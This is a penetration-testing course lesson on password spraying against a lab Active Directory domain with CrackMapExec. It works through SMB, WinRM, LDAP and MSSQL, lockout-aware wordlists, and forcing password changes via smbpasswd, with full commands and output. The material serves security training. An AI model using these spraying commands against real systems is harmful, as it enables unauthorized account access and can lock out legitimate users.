# Password Spraying

We found a list of users abusing the `NULL Session` flaw. We now need to find a valid password to gain a foothold in the domain. If we do not have a proper list of users, or the target is not vulnerable to a `NULL Session` attack, we will need another way to find valid usernames, like OSINT (i.e., hunting on LinkedIn), brute-forcing with a large username list and Kerbrute, physical recon, etc. In this section, we will learn how to find a valid set of credentials by testing authentication against a set of targets once we have a list of usernames.

***

## Creating a Password List

We do not know these users' passwords, but what we know is the password policy. We can build a custom wordlist of common passwords such as `Welcome1` and `Password123`, the current month with the year at the end, the company name or the domain name, and apply different mutations. To learn more about password mutations, check out the Academy module [Password Attacks](https://academy.hackthebox.com/module/details/147/). Let's use the domain name as the password with a capital letter, a number, and an exclamation mark at the end:

### **Password List & User List**

```shell-session
$ cat passwords.txt

Inlanefreight01!
Inlanefreight02!
Inlanefreight03!
```

```shell-session
$ cat users.txt 

noemi
david
carlos
grace
peter
robert
administrator
```

{% hint style="info" %}
**Note:** We will need to use the complete username list to complete the exercises in this section.
{% endhint %}

Now we need to select the protocol and the target and use the option `-u` to provide a username(s) or file(s) containing usernames and the option `-p` to provide the password(s) or file(s) containing passwords. Let's see some examples using the SMB protocol:

### **Password Attack with a File with Usernames and a Single Password**

```shell-session
$ crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
```

### **Password Attack with a List of Usernames and a Single Password**

```shell-session
$ crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
```

### **Password Attack with a List of Usernames and Two Passwords**

```shell-session
$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
```

As we can see from the output, we found only one valid credential in the domain represented in green and starting with the output `[+]`. Nevertheless, not all accounts have been tested. After the first valid credentials are found, CME stops password spraying since it is usually sufficient for the rest of the domain enumeration. Sometimes, it is better to test all accounts because we may find a privileged account. For that purpose, CME comes with the option `--continue-on-success`:

### **Continue on Success**

```shell-session
$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\grace:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02!
```

We could also provide a password list with a file, for example, `passwords.txt`, which will test all passwords for each user, which can be helpful for password spraying but not so much when there is an Account Lockout policy set. We will discuss Account Lockout later in this section.

If we know the account lockout is set to 5, we could create a password list of 2 or 3 passwords to prevent an account from being locked out.

### **Password Attack with a List of Usernames and a Password List**

```shell-session
$ crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt 

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight03! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\david:Inlanefreight03! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02!
```

## Checking One User Equal to One Password with a Wordlist

Another great feature of CME is if we know each user's password, and we want to test if they are still valid. For that purpose, use the option `--no-bruteforce`. This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on.

### **Disable Bruteforcing**

```shell-session
$ cat userfound.txt 

grace
carlos
```

```shell-session
$ cat passfound.txt 

Inlanefreight01!
Inlanefreight02!
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02!
```

## Testing Local Accounts

In case we would like to test a local account instead of a domain account, we can use the `--local-auth` option in CrackMapExec:

### **Password Spraying Local Accounts**

```shell-session
$ crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth

SMB         192.168.133.157 445    WIN10             [*] Windows 10.0 Build 22000 x64 (name:WIN10) (domain:WIN10) (signing:False) (SMBv1:True)
SMB         192.168.133.157 445    WIN10             [+] WIN10\Administrator:Password@123
```

{% hint style="info" %}
**Note:** Domain Controllers don't have a local account database, so we can't use the flag `--local-auth` against a Domain Controller.
{% endhint %}

***

## Account Lockout

Be careful when performing Password Spraying. We need to ensure the value: `Account Lockout Threshold` is set to None. If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes). Otherwise, there is a risk that we lock all accounts in the domain for 30 minutes or more (check the Locked Account Duration for how long this is). Occasionally a domain password policy will be set to require an administrator to manually unlock accounts which could create an even bigger issue if we lock out one or more accounts with careless Password Spraying. If you already have a user account, you can query its `Bad-Pwd-Count` attribute, which measures the number of times the user tried to log on to the account using an incorrect password.

### **Query Bad Password Count**

```shell-session
$ crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.203.121  445    DC01             inlanefreight.htb\alina                          badpwdcount: 0 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\peter                          badpwdcount: 2 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\grace                          badpwdcount: 0 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\robert                         badpwdcount: 3 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\carlos                         badpwdcount: 1 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\svc_workstations               badpwdcount: 0 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\john                           badpwdcount: 0 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\david                          badpwdcount: 4 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\julio                          badpwdcount: 3 desc: 
SMB         10.129.203.121  445    DC01             inlanefreight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.129.203.121  445    DC01             inlanefreight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.129.203.121  445    DC01             inlanefreight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

With this information, you can create a better strategy for password attacks.

{% hint style="info" %}
**Note:** The Bad Password Count resets if the user authenticates with the correct credentials.
{% endhint %}

***

## Account Status

When we test an account, there are three colors that CME can display:

<table data-header-hidden><thead><tr><th width="133.0909423828125"></th><th></th></tr></thead><tbody><tr><td><strong>Color</strong></td><td><strong>Description</strong></td></tr><tr><td>Green</td><td>The username and the password is valid.</td></tr><tr><td>Red</td><td>The username or the password is invalid.</td></tr><tr><td>Magenta</td><td>The username and password are valid, but the authentication is not successful.</td></tr></tbody></table>

Authentication can be unsuccessful while the password is still valid for various reasons. Here is a complete list:

|                                   |
| --------------------------------- |
| STATUS\_ACCOUNT\_DISABLED         |
| STATUS\_ACCOUNT\_EXPIRED          |
| STATUS\_ACCOUNT\_RESTRICTION      |
| STATUS\_INVALID\_LOGON\_HOURS     |
| STATUS\_INVALID\_WORKSTATION      |
| STATUS\_LOGON\_TYPE\_NOT\_GRANTED |
| STATUS\_PASSWORD\_EXPIRED         |
| STATUS\_PASSWORD\_MUST\_CHANGE    |
| STATUS\_ACCESS\_DENIED            |

Depending on the reason, for example, `STATUS_INVALID_LOGON_HOURS` or `STATUS_INVALID_WORKSTATION` may be a good idea to try another workstation or another time. In the case of the message `STATUS_PASSWORD_MUST_CHANGE`, we can change the user's password using [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) like: `smbpasswd -r domain -U user`.

### **Changing Password for an Account with Status PASSWORD\_MUST\_CHANGE**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
```

Here we can change the password for the target user. During a penetration test, we want to be careful with changing account passwords and always note any account changes in our report appendices. If the target account has not logged in for a long time, it is likely safer to change the password than for an account that is actively in use. Typically an organization will disable unused accounts, but from time to time, we will come across forgotten accounts whose passwords we can change to move further toward our assessment goal. If in doubt, always check with the customer before making any changes.

```shell-session
$ smbpasswd -r 10.129.203.121 -U peter

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user peter
```

We can now authenticate with the new password.

```shell-session
$ crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\peter:Password123
```

***

## Target Protocol WinRM

By default, [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) service, which is essentially designed for remote administration, allows us to execute PowerShell commands on a target. WinRM is enabled by default on Windows Server 2012 R2 / 2016 / 2019 on ports TCP/5985 (HTTP) and TCP/5986 (HTTPS). PowerShell Remoting uses [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal), which is the Microsoft implementation of the [Web Services for Management (WS-Management)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protocol.

To connect to the WinRM service on a remote computer, we need to have local administrator privileges, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

WinRM is not the best protocol to identify if a password is valid because it will only indicate that the account is valid if it has access to WinRM. In this scenario, we can test the three (3) accounts we have found and use the `--no-bruteforce` option to see if any of those three (3) accounts have access to WinRM.

### **WinRM - Password Spraying**

```shell-session
$ crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\peter:Password123
```

```shell-session
$ crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
SMB         10.129.203.121  5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        10.129.203.121  5985   DC01             [*] http://10.129.203.121:5985/wsman
WINRM       10.129.203.121  5985   DC01             [-] inlanefreight.htb\grace:Inlanefreight01!
WINRM       10.129.203.121  5985   DC01             [-] inlanefreight.htb\robert:Inlanefreight01!
WINRM       10.129.203.121  5985   DC01             [+] inlanefreight.htb\peter:Password123 (Pwn3d!)
```

We can execute commands on the system with the account Peter, who has local admin rights. We will cover more about this in the section [Command Execution](https://academy.hackthebox.com/module/84/section/812).

***

## LDAP - Password Spraying

When doing Password Spraying against the LDAP protocol, we need to use the FQDN otherwise, we will receive an error:

### **Error when using the IP**

```shell-session
$ crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.203.121  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! Error connecting to the domain, are you sure LDAP service is running on the target ?
LDAP        10.129.203.121  445    DC01             [-] inlanefreight.htb\grace:Inlanefreight01! Error connecting to the domain, are you sure LDAP service is running on the target ?
```

We have two options to solve this issue: configure our attack host to use the domain name server (DNS) or configure the KDC FQDN in our `/etc/hosts` file. Let's go with the second option and add the FQDN to our `/etc/hosts` file:

### **Adding the FQDN to the hosts file and Performing a Password Spray**

```shell-session
$ cat /etc/hosts | grep inlanefreight

10.129.203.121 inlanefreight.htb        dc01.inlanefreight.htb
```

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!

SMB         dc01.inlanefreight.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! 
LDAP        dc01.inlanefreight.htb  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01
```

***

## Authentication Mechanisms

Some Windows services, such as MSSQL, SSH, or FTP, can be configured to handle their user database or to integrate with Windows. If this is the case, we could try Password Spraying against the local database used by the service, against Active Directory users, or against local users of the computer where the service is installed. Let's see how we can perform a Password Spray against an MSSQL Server via different authentication mechanisms.

***

## MSSQL - Password Spray

[Microsoft SQL Server (MSSQL)](https://www.microsoft.com/en-us/sql-server/sql-server-2019) is a relational database management system that stores data in tables, columns, and rows. Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, Personal Identifiable Information (PII), business-related data, and payment information.

## MSSQL Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

<table data-header-hidden><thead><tr><th width="204.90911865234375"></th><th></th></tr></thead><tbody><tr><td><strong>Authentication Type</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Windows authentication mode</code></td><td>This is the default, often referred to as <code>integrated</code> security, because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td></tr><tr><td><code>Mixed mode</code></td><td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td></tr></tbody></table>

This means that we can have three types of users to authenticate to `MSSQL`:

1. Active Directory Account.
2. Local Windows Account.
3. SQL Account.

For an Active Directory account, we need to specify the domain name:

### **Password Spray - Active Directory Account**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.203.121  1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.129.203.121  1433   DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
```

For a local Windows Account, we need to specify a dot (.) as the domain option `-d` or the target machine name:

### **Password Spray - Local Windows Account**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .

MSSQL       10.129.203.121  1433   None             [*] None (name:10.129.203.121) (domain:.)
MSSQL       10.129.203.121  1433   None             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.129.203.121  1433   None             [+] .\grace:Inlanefreight01!
```

{% hint style="info" %}
**Note:** Since this is a Domain Controller, Windows local accounts have not been used. This example will apply when targeting a non-Domain Controller machine with local windows accounts.
{% endhint %}

Commonly administrators may create accounts with the same name as their Active Directory accounts for local usage or testing. We may find MSSQL accounts created with the same name and password as the Active Directory account. Password reuse is very common! If we want to try a SQL Account, we need to specify the flag `--local-auth`:

### **Password Spray - SQL Account**

```shell-session
$ crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth

MSSQL       10.129.203.121  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.203.121  1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'julio'.
MSSQL       10.129.203.121  1433   DC01             [+] grace:Inlanefreight01!
```

As we can see, the account `grace` exists locally in the MSSQL database with the same password.

***

## Other Protocols

Remember that sometimes a user may not be an administrator, but they may have privileges to access other protocols such as RDP, SSH, FTP, etc. It is crucial when performing Password Spraying to understand the target and try to attack as many protocols as possible.

{% hint style="info" %}
**Note:** When we are doing Password Spray using Active Directory authentication, the count of failed password attempts will be the same for all protocols. For example, if the lockout limit is five attempts and we try three passwords using RDP and two passwords against WinRM, the count will reach 5, and we will have caused the account to be locked out.
{% endhint %}
